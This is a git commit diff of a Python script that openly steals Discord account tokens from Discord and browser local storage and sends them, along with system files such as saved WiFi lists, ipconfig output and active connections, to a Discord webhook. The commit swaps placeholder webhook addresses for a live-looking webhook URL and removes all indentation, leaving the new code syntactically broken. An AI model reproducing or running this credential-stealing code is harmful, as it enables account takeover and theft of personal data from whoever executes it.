584e6d197d918c76ae7d47c482d6f412366794a6
maxdelhanty-hue <maxdelhanty@gmail.com>
2026-04-09 16:16:09 -0500

    Update 38.py

--- 38.py
+++ 38.py
@@ -3,79 +3,79 @@ import re
 import json
 from urllib.request import Request, urlopen
 
-WEBHOOK_URL = 'WEBHOOK HERE' # PUT WEBHOOK HERE
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1490169355806179491/QnZuC3kc7T-1Iy5Dh7Sel-Z09X5TDdXbuw8Bg-jsOU2X8qLlHBduh44HgfQQ3xfS2aDi' # PUT WEBHOOK HERE
 
 PING_ME = False
 
 def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
+path += '\\Local Storage\\leveldb'
 
-    tokens = []
+tokens = []
 
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
+for file_name in os.listdir(path):
+if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+continue
 
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
+for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+for token in re.findall(regex, line):
+tokens.append(token)
+return tokens
 
 def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
 
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
+paths = {
+'Discord': roaming + '\\Discord',
+'Discord Canary': roaming + '\\discordcanary',
+'Discord PTB': roaming + '\\discordptb',
+'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+'Opera': roaming + '\\Opera Software\\Opera Stable',
+'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+}
 
-    message = '@everyone' if PING_ME else ''
+message = '@everyone' if PING_ME else ''
 
-    for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
+for platform, path in paths.items():
+if not os.path.exists(path):
+continue
 
-        message += f'\n**{platform}**\n```\n'
+message += f'\n**{platform}**\n```\n'
 
-        tokens = find_tokens(path)
+tokens = find_tokens(path)
 
-        if len(tokens) > 0:
-            for token in tokens:
-                message += f'{token}\n'
-        else:
-            message += 'No tokens found.\n'
+if len(tokens) > 0:
+for token in tokens:
+message += f'{token}\n'
+else:
+message += 'No tokens found.\n'
 
-        message += '```'
+message += '```'
 
-    headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-    }
+headers = {
+'Content-Type': 'application/json',
+'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+}
 
-    payload = json.dumps({'content': message})
+payload = json.dumps({'content': message})
 
-    try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-        urlopen(req)
-    except:
-        pass
+try:
+req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+urlopen(req)
+except:
+pass
 
 if __name__ == '__main__':
-    main()
-    
+main()
+
 os.system("py addr.py > Files\RegistryInfo.txt")
-os.system('''curl -i -H 'Expect: application/json' -F file=@Files\image.jpg -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
-os.system('''curl -i -H 'Expect: application/json' -F file=@Files\ExtraSystemInfo.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
-os.system('''curl -i -H 'Expect: application/json' -F file=@Files\ipconfig.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
-os.system('''curl -i -H 'Expect: application/json' -F file=@Files\systemperms.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
-os.system('''curl -i -H 'Expect: application/json' -F file=@Files\WiFi-List.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
-os.system('''curl -i -H 'Expect: application/json' -F file=@Files\ActiveConnections.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
-os.system('''curl -i -H 'Expect: application/json' -F file=@Files\driverquery.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
+os.system('''curl -i -H 'Expect: application/json' -F file=@Files\image.jpg -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/1490169355806179491/QnZuC3kc7T-1Iy5Dh7Sel-Z09X5TDdXbuw8Bg-jsOU2X8qLlHBduh44HgfQQ3xfS2aDi''') # PUT WEBHOOK HERE
+os.system('''curl -i -H 'Expect: application/json' -F file=@Files\ExtraSystemInfo.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/1490169355806179491/QnZuC3kc7T-1Iy5Dh7Sel-Z09X5TDdXbuw8Bg-jsOU2X8qLlHBduh44HgfQQ3xfS2aDi''') # PUT WEBHOOK HERE
+os.system('''curl -i -H 'Expect: application/json' -F file=@Files\ipconfig.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/1490169355806179491/QnZuC3kc7T-1Iy5Dh7Sel-Z09X5TDdXbuw8Bg-jsOU2X8qLlHBduh44HgfQQ3xfS2aDi''') # PUT WEBHOOK HERE
+os.system('''curl -i -H 'Expect: application/json' -F file=@Files\systemperms.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/1490169355806179491/QnZuC3kc7T-1Iy5Dh7Sel-Z09X5TDdXbuw8Bg-jsOU2X8qLlHBduh44HgfQQ3xfS2aDi''') # PUT WEBHOOK HERE
+os.system('''curl -i -H 'Expect: application/json' -F file=@Files\WiFi-List.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/1490169355806179491/QnZuC3kc7T-1Iy5Dh7Sel-Z09X5TDdXbuw8Bg-jsOU2X8qLlHBduh44HgfQQ3xfS2aDi''') # PUT WEBHOOK HERE
+os.system('''curl -i -H 'Expect: application/json' -F file=@Files\ActiveConnections.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/1490169355806179491/QnZuC3kc7T-1Iy5Dh7Sel-Z09X5TDdXbuw8Bg-jsOU2X8qLlHBduh44HgfQQ3xfS2aDi''') # PUT WEBHOOK HERE
+os.system('''curl -i -H 'Expect: application/json' -F file=@Files\driverquery.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/1490169355806179491/QnZuC3kc7T-1Iy5Dh7Sel-Z09X5TDdXbuw8Bg-jsOU2X8qLlHBduh44HgfQQ3xfS2aDi''') # PUT WEBHOOK HERE
 exit()
